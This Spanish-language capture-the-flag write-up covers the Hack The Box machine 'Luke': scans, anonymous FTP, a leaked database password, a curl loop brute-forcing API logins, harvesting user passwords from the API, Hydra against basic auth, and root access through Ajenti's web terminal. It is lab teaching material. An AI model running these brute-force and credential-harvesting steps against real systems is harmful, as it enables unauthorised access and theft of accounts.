+++
author = "Andrés Del Cerro"
title = "Hack The Box: Luke Writeup | Medium"
date = "2024-08-05"
description = ""
tags = [
    "HackTheBox",
    "Luke",
    "Writeup",
    "Cybersecurity",
    "Penetration Testing",
    "CTF",
    "Privilege Escalation",
    "RCE",
    "Exploit",
    "FreeBSD",
    "Web Fuzzing",
    "Information Leakage",
    "Password Spraying",
    "Abusing API",
    "Bruteforcing",
    "Abusing Ajenti Terminal"
]

+++

# Hack The Box: Luke Writeup

Welcome to my detailed writeup of the medium difficulty machine **"Luke"** on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.

# TCP Enumeration

```shell
$ rustscan -a 10.129.96.55 --ulimit 5000 -g 
10.129.96.55 -> [21,22,80,3000,8000]
```

```shell
$ nmap -p21,22,80,3000,8000 -sCV 10.129.96.55 -oN allPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-05 22:29 CEST
Stats: 0:02:18 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 80.00% done; ETC: 22:32 (0:00:35 remaining)
Nmap scan report for 10.129.96.55
Host is up (0.036s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3+ (ext.1)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.18
|      Logged in as ftp
|      TYPE: ASCII
|      No session upload bandwidth limit
|      No session download bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3+ (ext.1) - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0             512 Apr 14  2019 webapp
22/tcp   open  ssh?
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp   open  http    Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
|_http-title: Luke
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
8000/tcp open  http    Ajenti http control panel
|_http-title: Ajenti

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 182.03 seconds
```
# UDP Enumeration

```shell
$ sudo nmap --top-ports 1500 -sU --min-rate 5000 -n -Pn 10.129.96.55 -oN allPorts.UDP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-05 22:33 CEST
Nmap scan report for 10.129.96.55
Host is up (0.055s latency).
All 1500 scanned ports on 10.129.96.55 are in ignored states.
Not shown: 1305 open|filtered udp ports (no-response), 195 closed udp ports (port-unreach)

Nmap done: 1 IP address (1 host up) scanned in 0.80 seconds
```
# FTP Enumeration
Podemos iniciar sesión de forma anónima en el FTP, encontramos un archivo llamado `for_Chihiro.txt`

```
Dear Chihiro !!

As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of 
the actual website I've created .
Normally you should know where to look but hurry up because I will delete them soon because of our security policies ! 

Derry
```
De este mensaje podemos sacar la conclusión de que existen dos usuarios, `chihiro` y `derry` y de que en alguna parte debe de haber recursos que no deberían de estar debido a las políticas de seguridad.
# 80/TCP Enumeration

```shell
$ whatweb http://10.129.96.55
http://10.129.96.55 [200 OK] Apache[2.4.38], Bootstrap, Country[RESERVED][ZZ], Email[contact@luke.io], HTML5, HTTPServer[FreeBSD][Apache/2.4.38 (FreeBSD) PHP/7.3.3], IP[10.129.96.55], JQuery, PHP[7.3.3], Script, Title[Luke]
```
Encontramos el dominio `luke.io`

Vemos que se está utilizando PHP por detrás.
```shell
$ feroxbuster -u http://10.129.96.55 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -d 2 -t 100
                                                                                          
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.4
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.96.55
 🚀  Threads               │ 100
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.4
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 2
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       24w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       24w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       29l       99w      927c http://10.129.96.55/js/scrolling-nav.js
200      GET       40l       77w      793c http://10.129.96.55/css/signin.css
200      GET       12l       32w      323c http://10.129.96.55/css/scrolling-nav.css
200      GET        7l      965w    76308c http://10.129.96.55/vendor/bootstrap/js/bootstrap.bundle.min.js
200      GET        6l     1429w   121200c http://10.129.96.55/css/bootstrap.min.css
301      GET        7l       20w      235c http://10.129.96.55/member => http://10.129.96.55/member/
200      GET       39l      118w     1593c http://10.129.96.55/login.php
401      GET       12l       46w      381c http://10.129.96.55/management
301      GET        7l       20w      232c http://10.129.96.55/css => http://10.129.96.55/css/
301      GET        7l       20w      231c http://10.129.96.55/js => http://10.129.96.55/js/
301      GET        7l       20w      235c http://10.129.96.55/vendor => http://10.129.96.55/vendor/
200      GET        6l       25w      202c http://10.129.96.55/config.php
200      GET      108l      240w     3138c http://10.129.96.55/
200      GET       21l      172w     1093c http://10.129.96.55/LICENSE
404      GET        7l       25w      203c http://10.129.96.55/%20.php
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_129_96_55-1722890241.state ...
[##>-----------------] - 17s    22962/220575  3m      found:15      errors:20     
[#>------------------] - 17s    11436/220545  688/s   http://10.129.96.55/ 
[####################] - 0s    220545/220545  926660/s http://10.129.96.55/css/ => Directory listing
[####################] - 0s    220545/220545  2864221/s http://10.129.96.55/vendor/ => Directory listing
[####################] - 0s    220545/220545  5513625/s http://10.129.96.55/member/ => Directory listing
[####################] - 0s    220545/220545  5513625/s http://10.129.96.55/js/ => Directory listing
```

Vemos una ruta `/management` y otra `/member` que me llaman la atención.

Vemos un `config.php` que sospechosamente nos reporta que tiene contenido.

Genial..
```shell
$ curl http://10.129.96.55/config.php
$dbHost = 'localhost';
$dbUsername = 'root';
$dbPassword  = 'Zk6heYCyv6ZE9Xcg';
$db = "login";

$conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die("Connect failed: %s\n". $conn -> error);
```

Tenemos una credencial `Zk6heYCyv6ZE9Xcg`
No sabemos para qué aún.

No consigo iniciar sesión en este panel.
![Write-up Image](images/Screenshot_1.png)

El endpoint de `/management` también está protegido y no consigo iniciar sesión.
![Write-up Image](images/Screenshot_2.png)

La ruta `/member` está vacia.

# 3000/TCP & 8000/TCP
Por el puerto :3000 parece que hay una API por detrás.
![Write-up Image](images/Screenshot_3.png)

Por el puerto :8000 hay un CMS llamado Ajenti.
![Write-up Image](images/Screenshot_4.png)

Hay varias vulnerabilidades asociadas a Ajenti, pero necesito estar autenticado.
![Write-up Image](images/Screenshot_5.png)

Decidí investigar un poco mas la API.
```shell
$ curl -X GET http://10.129.96.55:3000 -H 'Authorization: test'
{"success":false,"message":"Token is not valid"}
```

Intenté varias cosas pero nada funcionó, así que vamos a fuzzear a ver si encontramos algún endpoint curioso.

![Write-up Image](images/Screenshot_6.png)

Vemos un endpoint `/users` pero necesito estar autenticado
```shell
$ curl -X GET http://10.129.96.55:3000/users -H 'Authorization: '
{"success":false,"message":"Auth token is not supplied"}
```

```shell
$ curl -X POST http://10.129.96.55:3000/login --data "username=root&password=test"Forbidden┌─[192.168.1.52]─[pointedsec@parrot]─[~/Desktop/luke/content]
└──╼ [★]$ curl -X POST http://10.129.96.55:3000/login --data "user=root&password=test"
Bad Request┌─[192.168.1.52]─[pointedsec@parrot]─[~/Desktop/luke/content]
└──╼ [★]$ curl -X POST http://10.129.96.55:3000/login --data "username=root&password=test"Forbidden┌─[192.168.1.52]─[pointedsec@parrot]─[~/Desktop/luke/content]
```

Deduzco que la data se la tengo que mandar en formato `x-www-form-urlencoded` y que los campos son `username` y `password`
```shell
$ curl -X POST http://10.129.96.55:3000/login --data "username=root&password=test"Forbidden┌─[192.168.1.52]─[pointedsec@parrot]─[~/Desktop/luke/content]
└──╼ [★]$ curl -X POST http://10.129.96.55:3000/login --data "user=root&password=test"
Bad Request┌─[192.168.1.52]─[pointedsec@parrot]─[~/Desktop/luke/content]
└──╼ [★]$ curl -X POST http://10.129.96.55:3000/login --data "username=root&password=test"Forbidden┌─[192.168.1.52]─[pointedsec@parrot]─[~/Desktop/luke/content]
```

Intento iniciar sesión con las credenciales que ya tenía.
```shell
$ curl -X POST http://10.129.96.55:3000/login --data "username=root&password=Zk6heYCyv6ZE9Xcg"
Forbidden┌─[192.168.1.52]─[pointedsec@parrot]─[~/Desktop/luke/content]
└──╼ [★]$ curl -X POST http://10.129.96.55:3000/login --data "username=chihiro&password=Zk6heYCyv6ZE9Xcg"
Forbidden┌─[192.168.1.52]─[pointedsec@parrot]─[~/Desktop/luke/content]
└──╼ [★]$ curl -X POST http://10.129.96.55:3000/login --data "username=derry&password=Zk6heYCyv6ZE9Xcg"
Forbidden
```

Y nada. Así que probé a hacer una pequeña fuerza bruta... 

Y sorprendentemente funcionó.
```shell
$ for username in $(cat /opt/SecLists/Usernames/cirt-default-usernames.txt | awk '{print tolower($0)}'); do echo " -> $username"; curl -X POST http://10.129.96.55:3000/login --data "username=$username&password=Zk6heYCyv6ZE9Xcg"; done
 -> !root
Forbidden -> $aloc$
Forbidden -> $srv
Forbidden -> $system
Forbidden -> (null)
Forbidden -> (any)
Forbidden -> (created)
Forbidden -> 1
Forbidden -> 11111111
Forbidden -> 12.x
Forbidden -> 1502
Forbidden -> 18140815
Forbidden -> 1nstaller
Forbidden -> 2
Forbidden -> 22222222
Forbidden -> 30
Forbidden -> 31994
Forbidden -> 4dgifts
Forbidden -> 5
Forbidden -> 6.x
Forbidden -> 7
Forbidden -> adams
Forbidden -> adldemo
Forbidden -> admin
{"success":true,"message":"Authentication successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzIyODg0MDU2LCJleHAiOjE3MjI5NzA0NTZ9.FyEpFhkz8V0rIXmjcegdmvZ2sXIdPO-OMdVa6OD0C_Y"} -> administrator
```

Ahora podemos ver mas usuarios...
```shell
$ curl -s -X GET http://10.129.96.55:3000/users -H 'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzIyODg0MDU2LCJleHAiOjE3MjI5NzA0NTZ9.FyEpFhkz8V0rIXmjcegdmvZ2sXIdPO-OMdVa6OD0C_Y' | jq
[
  {
    "ID": "1",
    "name": "Admin",
    "Role": "Superuser"
  },
  {
    "ID": "2",
    "name": "Derry",
    "Role": "Web Admin"
  },
  {
    "ID": "3",
    "name": "Yuri",
    "Role": "Beta Tester"
  },
  {
    "ID": "4",
    "name": "Dory",
    "Role": "Supporter"
  }
]

```

Otro comportamiento extraño es que podemos indicar un usuario, esto es común, pero se nos devuelve una contraseña...
```shell
$ curl -s -X GET http://10.129.96.55:3000/users/dory -H 'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzIyODg0MDU2LCJleHAiOjE3MjI5NzA0NTZ9.FyEpFhkz8V0rIXmjcegdmvZ2sXIdPO-OMdVa6OD0C_Y' | jq
{
  "name": "Dory",
  "password": "5y:!xa=ybfe)/QD"
}

```

Vamos a recopilar estas credenciales...
```shell
$ for user in $(cat users.txt); do curl -s -X GET http://10.129.96.55:3000/users/$user -H 'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzIyODg0MDU2LCJleHAiOjE3MjI5NzA0NTZ9.FyEpFhkz8V0rIXmjcegdmvZ2sXIdPO-OMdVa6OD0C_Y' | jq; done
{
  "name": "Admin",
  "password": "WX5b7)>/rp$U)FW"
}
{
  "name": "Derry",
  "password": "rZ86wwLvx7jUxtch"
}
{
  "name": "Yuri",
  "password": "bet@tester87"
}
{
  "name": "Dory",
  "password": "5y:!xa=ybfe)/QD"
}
```

# Foothold
Ahora teniendo una lista de usuarios y credenciales, podemos probar a autenticarnos en `/management` o entrar en el Ajenti.

Fijándonos en [este](http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/) post...

```shell
$ hydra -L users.txt -P credentials.txt -s 80 -f 10.129.96.55 http-get /managementHydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-05 23:02:21
[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task
[DATA] attacking http-get://10.129.96.55:80/management
[80][http-get] host: 10.129.96.55   login: Derry   password: rZ86wwLvx7jUxtch
[STATUS] attack finished for 10.129.96.55 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-08-05 23:02:22
```

Y al acceder a `/management` vemos un hipervínculo hacia `/management/config.json`
![Write-up Image](images/Screenshot_7.png)

Vemos unas credenciales justo debajo de lo que parece ser la configuración del `Ajenti` 

Buscando en Google vemos que por defecto, en `Ajenti` el usuario administrador se llama `root`

Así que probando `root:KpMasng6S5EtTy9Z`
![Write-up Image](images/Screenshot_8.png)

Antes de probar ningún exploit, vemos un apartado `Terminal` donde podemos crear una supuesta consola..
![Write-up Image](images/Screenshot_9.png)

Veo que estoy en la máquina víctima (no hay ningún contenedor) y que encima estoy ejecutando comandos como `root`
![Write-up Image](images/Screenshot_10.png)

Y ya podríamos leer las flags. dos por el precio de una.
![Write-up Image](images/Screenshot_11.png)

¡Y ya estaría!

Happy Hacking! 🚀